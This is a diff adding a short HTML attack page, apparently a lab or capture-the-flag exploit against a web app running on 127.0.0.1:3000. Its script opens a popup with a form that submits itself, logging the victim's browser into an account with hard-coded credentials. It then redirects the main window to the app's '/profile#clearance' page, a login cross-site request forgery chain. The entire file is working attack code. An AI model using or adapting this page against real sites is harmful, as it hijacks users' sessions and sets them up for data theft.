@@ -1,0 +1,18 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>load</title></head>
+<body style="margin:0;background:#fff">
+<script>
+var LOGIN = 'http://127.0.0.1:3000/login';
+var PROFILE = 'http://127.0.0.1:3000/profile#clearance';
+var FORM = '<form id="f" method="POST" action="' + LOGIN + '">' +
+  '<input name="username" value="drone9271">' +
+  '<input name="password" value="DronePass9271">' +
+  '</form><script>document.getElementById("f").submit();<\/scr'+'ipt>';
+try {
+  var w = window.open('', 'lg', 'width=200,height=200,left=0,top=0');
+  if (w) { w.document.open(); w.document.write(FORM); w.document.close(); }
+} catch(e){}
+// after popup logs in (first-party cookie set), navigate main window to profile
+setTimeout(function(){ try{ if(window.opener===null){} }catch(e){} window.location.href = PROFILE; }, 3000);
+</script>
+</body></html>
